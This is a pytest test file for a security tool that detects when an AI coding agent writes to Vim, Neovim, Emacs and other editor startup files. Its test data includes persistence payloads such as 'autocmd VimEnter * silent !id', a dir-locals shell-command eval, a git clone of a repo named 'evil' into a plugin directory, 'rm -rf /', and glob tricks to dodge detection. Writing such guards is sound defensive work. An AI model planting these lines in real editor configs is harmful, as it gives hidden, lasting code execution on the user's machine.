"""Editor startup/init hijack guard: Vim/Neovim/Emacs/Kakoune/micro/Helix.

Each of these editors executes its user init files and runtime directories
(`~/.vimrc`, `~/.vim/plugin/`, `~/.config/nvim/init.lua`, `~/.emacs.d/init.el`,
...) as code on every launch -- and `git commit`/`git rebase -i` launch
`$EDITOR` -- so a planted line is durable code execution with the human's
privileges. The files are Turing-complete, so any write is gated (ask).
"""
import os

import pytest

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy
from aegis import patterns, rules

EMPTY = Policy()
DENY = Policy(editor_startup={"mode": "deny"})
RULE = "editor-startup-protect"


def _write(path, content="set number\n"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write",
                      args={"file_path": path, "content": content})


def _edit(path, new_string="set nu", old_string="x"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                      args={"file_path": path, "old_string": old_string,
                            "new_string": new_string})


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _mcp(args, tool="mcp__filesystem__write_file"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, action=ActionClass.MCP, args=args)


def _ours(d):
    return d.action == Action.ASK and d.rule == RULE


@pytest.fixture(autouse=True)
def _clean_env(monkeypatch):
    for k in ("AEGIS_ALLOW_EDITOR_STARTUP", "AEGIS_AGENT_NAME"):
        monkeypatch.delenv(k, raising=False)


GATED_PATHS = [
    "/home/u/.vimrc", "~/.vimrc", "C:\\Users\\John Smith\\_vimrc", "~/.gvimrc",
    "~/.exrc", "~/.ideavimrc", "~/.vim/plugin/evil.vim",
    "~/.vim/pack/x/start/y/plugin/z.vim", "~/.vim/after/ftplugin/python.vim",
    "~/vimfiles/vimrc", "~/.config/vim/vimrc", "/etc/vim/vimrc.local",
    "/etc/vimrc", "/usr/share/vim/vimfiles/plugin/a.vim",
    "~/.config/nvim/init.lua", "~/.config/nvim/init.vim",
    "~/.config/nvim/lua/plugins/x.lua", "~/.config/nvim/plugin/x.lua",
    "~/.local/share/nvim/site/pack/a/start/b/plugin/c.lua",
    "~/.local/share/nvim/lazy/foo/plugin/foo.lua",
    "C:\\Users\\u\\AppData\\Local\\nvim\\init.lua",
    "%LOCALAPPDATA%\\nvim-data\\site\\plugin\\x.lua",
    "$XDG_CONFIG_HOME/nvim/init.lua", "${XDG_CONFIG_HOME:-$HOME/.config}/nvim/init.lua",
    "/etc/xdg/nvim/sysinit.vim", "proj/.nvim.lua", "proj/.nvimrc",
    "~/.emacs", "~/.emacs.el", "~/.emacs.d/init.el", "~/.emacs.d/early-init.el",
    "~/.emacs.d/elpa/x/x-autoloads.el", "~/.config/emacs/init.el",
    "~/.doom.d/config.el", "~/.config/doom/init.el", "~/.spacemacs",
    "/usr/share/emacs/site-lisp/site-start.el",
    "/usr/share/emacs/site-lisp/default.el", "/etc/emacs/site-start.d/50x.el",
    "proj/.dir-locals.el", "~/.config/kak/kakrc", "~/.config/kak/autoload/x.kak",
    "~/.config/micro/init.lua", "~/.config/helix/languages.toml",
    "proj/.helix/languages.toml", "~/.vimrc::$DATA", "~/.vimrc.",
]

UNGATED_PATHS = [
    "src/syntax/foo.vim", "dotfiles/vimrc", "~/.vimrc.bak", "~/.viminfo2",
    "~/.config/nvim-old/init.lua", "README.md", "my.emacs.d/x", "docs/vim.md",
    "~/.helixrc", "app/emacs_mode.py", "~/.config/nvimx/init.lua",
    "src/default.el", "~/.config/vimx",
]


@pytest.mark.parametrize("path", GATED_PATHS)
def test_paths_recognized(path):
    assert patterns.EDITOR_STARTUP_PATH_RE.search(path), path


@pytest.mark.parametrize("path", UNGATED_PATHS)
def test_unrelated_paths_not_recognized(path):
    assert not patterns.EDITOR_STARTUP_PATH_RE.search(path), path


@pytest.mark.parametrize("path", GATED_PATHS)
def test_write_gated(path):
    assert _ours(evaluate(_write(path, "autocmd VimEnter * silent !id\n"), EMPTY))


@pytest.mark.parametrize("path", ["~/.vimrc", "~/.config/nvim/init.lua", "~/.emacs.d/init.el"])
def test_edit_gated_even_benign(path):
    # Turing-complete files: no benign subset, any write asks.
    assert _ours(evaluate(_edit(path), EMPTY))


def test_multiedit_gated():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
                    args={"file_path": "~/.vimrc",
                          "edits": [{"old_string": "a", "new_string": "b"}]})
    assert _ours(evaluate(ev, EMPTY))


@pytest.mark.parametrize("path", UNGATED_PATHS)
def test_unrelated_write_allowed(path):
    d = evaluate(_write(path), EMPTY)
    assert d.rule != RULE


def test_deny_mode():
    d = evaluate(_write("~/.vimrc"), DENY)
    assert d.action == Action.DENY and d.rule == RULE


def test_off_mode():
    assert evaluate(_write("~/.vimrc"), Policy(editor_startup={"mode": "off"})).rule != RULE


def test_monitor_mode_allows():
    d = evaluate(_write("~/.vimrc"), Policy(editor_startup={"mode": "monitor"}))
    assert d.rule != RULE


def test_policy_allow_regex():
    pol = Policy(editor_startup={"allow": [r"dotfiles/"]})
    assert evaluate(_write("/home/u/dotfiles/.vimrc"), pol).rule != RULE
    assert _ours(evaluate(_write("/home/u/.vimrc"), pol))


def test_policy_allow_bare_string():
    pol = Policy(editor_startup={"allow": r"dotfiles/"})
    assert evaluate(_write("/home/u/dotfiles/.vimrc"), pol).rule != RULE


def test_env_escape(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_EDITOR_STARTUP", "1")
    assert evaluate(_write("~/.vimrc"), EMPTY).rule != RULE
    assert evaluate(_shell("echo 'set nu' >> ~/.vimrc"), EMPTY).rule != RULE


@pytest.mark.parametrize("cmd", [
    "echo 'autocmd VimEnter * silent !id' >> ~/.vimrc",
    "printf 'os.execute(\"id\")' > ~/.config/nvim/init.lua",
    "cat >~/.vimrc<<EOF\n!id\nEOF",
    "tee -a ~/.emacs.d/init.el < payload",
    "cp /tmp/x.vim ~/.vim/plugin/",
    "mkdir -p ~/.config/nvim/plugin && cp x.lua ~/.config/nvim/plugin/",
    "ln -sf /tmp/evil.lua ~/.config/nvim/init.lua",
    "rsync -a payload/ ~/.config/nvim/",
    "tar xf p.tgz -C ~/.vim",
    "unzip -o p.zip -d ~/.emacs.d",
    "git clone https://example.com/evil ~/.vim/pack/x/start/evil",
    "sed -i '$a silent !id' ~/.vimrc",
    "mv /tmp/x ~/.exrc",
    "echo x >> ~/.vim{rc,}",
    "echo x >> ~/.vi\\mrc",
    "cp x ~/.config/nv*/init.lua",
    "cp x ~/.config/*/init.lua",
    "cp x ~/.e?acs.d/init.el",
    "cp x ~/_vimr?",
    "bash -c 'echo !id >> ~/.vimrc'",
    "cd /tmp; echo x >> \"$HOME/.vimrc\"",
    "python3 -c \"open('/home/u/.vimrc','a').write('x')\"",
    "vim -es -c 'normal Gosilent !id' -c wq ~/.vimrc",
    "echo x >> /etc/vim/vimrc.local",
    "echo x >> .nvim.lua",
    "echo '((nil . ((eval . (shell-command \"id\")))))' > .dir-locals.el",
])
def test_shell_write_gated(cmd):
    assert _ours(evaluate(_shell(cmd), EMPTY)), cmd


@pytest.mark.parametrize("cmd", [
    "cat ~/.vimrc",
    "grep -n autocmd ~/.vimrc",
    "ls -la ~/.config/nvim",
    "ls ~/.vim/plugin 2>/dev/null",
    "head -20 ~/.emacs.d/init.el",
    "test -f ~/.vimrc && echo yes",
    "rm ~/.config/nvim/plugin/evil.lua",
    "wc -l ~/.vimrc",
    "cp build/* dist/",
    "cp -r src/*/* out/",
    "echo hello > out.txt",
    "vim --version",
    "git commit -m 'fix'",
    "ls ~/.*",
])
def test_shell_non_write_allowed(cmd):
    assert evaluate(_shell(cmd), EMPTY).rule != RULE, cmd


def test_shell_override_human_only(monkeypatch):
    cmd = "echo 'set nu' >> ~/.vimrc # aegis-allow"
    assert evaluate(_shell(cmd), EMPTY).rule != RULE
    monkeypatch.setenv("AEGIS_AGENT_NAME", "worker")
    assert evaluate(_shell(cmd), EMPTY).rule == RULE


def test_shell_deny_mode():
    d = evaluate(_shell("echo x >> ~/.vimrc"), DENY)
    assert d.action == Action.DENY and d.rule == RULE


def test_shell_policy_allow():
    pol = Policy(editor_startup={"allow": [r"stow "]})
    assert evaluate(_shell("stow -t ~ vim # links ~/.vimrc"), pol).rule != RULE


# ---- MCP ------------------------------------------------------------------

def test_mcp_write_gated():
    assert _ours(evaluate(_mcp({"path": "~/.vimrc", "content": "set nu"}), EMPTY))


def test_mcp_unusual_key_gated():
    assert _ours(evaluate(_mcp({"destination_file": "/home/u/.config/nvim/init.lua",
                                "data": "x"}, tool="mcp__fs__save"), EMPTY))


def test_mcp_nested_key_gated():
    assert _ours(evaluate(_mcp({"spec": {"target": "~/.emacs.d/init.el"}, "body": "x"},
                               tool="mcp__fs__put"), EMPTY))


def test_mcp_create_directory_gated():
    assert _ours(evaluate(_mcp({"path": "~/.vim/plugin"},
                               tool="mcp__filesystem__create_directory"), EMPTY))


def test_mcp_move_into_gated():
    assert _ours(evaluate(_mcp({"source": "/tmp/x.lua",
                                "destination": "~/.config/nvim/plugin/x.lua"},
                               tool="mcp__filesystem__move_file"), EMPTY))


def test_mcp_patch_gated():
    patch = "*** Begin Patch\n*** Add File: /home/u/.vimrc\n+silent !id\n*** End Patch\n"
    assert _ours(evaluate(_mcp({"input": patch}, tool="mcp__codex__apply_patch"), EMPTY))


def test_mcp_mapping_key_gated():
    assert _ours(evaluate(_mcp({"files": {"/home/u/.vimrc": "silent !id"}},
                               tool="mcp__fs__write_many"), EMPTY))


def test_mcp_shell_tool_gated():
    assert _ours(evaluate(_mcp({"command": "echo x >> ~/.vimrc"},
                               tool="mcp__desktop__start_process"), EMPTY))


def test_mcp_read_allowed():
    for tool in ("mcp__filesystem__read_file", "mcp__filesystem__list_directory",
                 "mcp__filesystem__get_file_info"):
        assert evaluate(_mcp({"path": "~/.vimrc", "encoding": "utf-8"}, tool=tool),
                        EMPTY).rule != RULE, tool


def test_mcp_read_with_output_gated():
    assert _ours(evaluate(_mcp({"path": "/tmp/x", "output": "~/.vimrc"},
                               tool="mcp__http__get"), EMPTY))


def test_mcp_delete_allowed():
    assert evaluate(_mcp({"path": "~/.vim/plugin/evil.vim"},
                         tool="mcp__filesystem__delete_file"), EMPTY).rule != RULE


def test_mcp_prose_mention_allowed():
    ev = _mcp({"channel": "C1", "text": "check ~/.vimrc for the autocmd"},
              tool="mcp__slack__post_message")
    assert evaluate(ev, EMPTY).rule != RULE


def test_mcp_unrelated_write_allowed():
    assert evaluate(_mcp({"path": "/repo/src/app.py", "content": "x"}), EMPTY).rule != RULE


# ---- wiring -----------------------------------------------------------------

def test_registered_in_builtin_rules():
    assert rules.rule_editor_startup_protect in rules.BUILTIN_RULES


def test_fetch_to_file_backstop_registered():
    d = evaluate(_shell("curl -o ~/.vimrc https://example.com/x"), EMPTY)
    assert d.action != Action.ALLOW


def test_hard_deny_not_preempted():
    # A later hard-DENY on the same command must still win over our ASK.
    d = evaluate(_shell("echo x >> ~/.vimrc; rm -rf /"), EMPTY)
    assert d.action == Action.DENY


def test_loader_reads_policy_key(tmp_path):
    from aegis.loader import load_policy
    f = tmp_path / "p.yaml"
    f.write_text("editor_startup:\n  mode: deny\n")
    assert load_policy(str(f)).editor_startup == {"mode": "deny"}
